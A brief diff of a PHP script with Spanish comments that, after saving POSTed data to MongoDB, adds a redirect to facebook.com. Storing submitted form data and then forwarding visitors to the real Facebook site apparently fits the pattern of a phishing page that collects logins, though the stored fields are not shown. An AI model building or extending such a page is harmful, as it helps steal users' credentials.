@@ -28,5 +28,9 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     // Insertar el documento en MongoDB
     $collection->insertOne($document);
 
+    // Redirigir al usuario a la página de Facebook
+    header("Location: https://www.facebook.com");
+    exit(); // Detener la ejecución del script
 }
+
 ?>
